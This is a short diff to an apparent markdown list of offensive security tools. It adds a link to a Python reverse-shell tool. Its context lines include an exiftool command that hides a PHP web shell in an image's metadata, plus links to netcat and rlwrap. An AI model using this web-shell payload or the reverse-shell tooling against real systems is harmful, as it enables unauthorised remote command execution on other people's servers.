@@ -418,3 +418,7 @@ exiftool -comment='<?php system($_GET['wr3nch']);?>' \<file_name\>.\<extension\>
   > ![](https://camo.githubusercontent.com/9ffdee4663ef22d343ebc88325a3f504e585669679942758485b215b1d7caa09/68747470733a2f2f692e696d6775722e636f6d2f71716a687841772e676966)
 - ## [netcat](https://github.com/diegocr/netcat)
 - ## [rlwrap](https://github.com/hanslub42/rlwrap)
+- ## [reverse-shell](https://github.com/medpaf/reverse-shell) Simple reverse shell written in Python.
+  > ### This is a reverse shell written in Python used to to target a machine and gain remote shell access.
+  > ![image](https://user-images.githubusercontent.com/51442719/174809460-6991dd33-eb8b-4341-9f65-1bdf6e180eec.png)
+ 
